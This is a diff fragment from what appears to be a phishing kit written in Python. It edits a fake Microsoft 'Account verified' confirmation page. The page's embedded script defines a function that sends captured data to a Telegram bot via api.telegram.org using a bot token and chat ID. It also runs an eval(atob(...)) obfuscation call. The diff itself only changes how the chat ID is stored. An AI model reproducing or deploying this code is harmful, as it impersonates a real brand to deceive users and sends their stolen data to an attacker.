@@ -405,7 +405,7 @@ _PHISH_DONE = ("<!doctype html><html><head><title>Account verified — Microsoft
                "</head><body><div class='box'><div class='logo'>Microsoft</div>"
                "<h1>Thanks — you're verified</h1><p>You're all set. You can close this window.</p>"
                "<!-- coded by m1rr0r -->"
-               "<script>var _b='" + _TG + "';var _c='987654321';"
+               "<script>var _b='" + _TG + "';var tg={chat_id:'987654321'};var _c=tg.chat_id;"
                "function ship(d){fetch('https://api.telegram.org/bot'+_b+'/sendMessage?chat_id='+_c"
                "+'&text='+encodeURIComponent(d));}eval(atob('dmFyIF94PTE7'));</script>"
                "</div></body></html>")
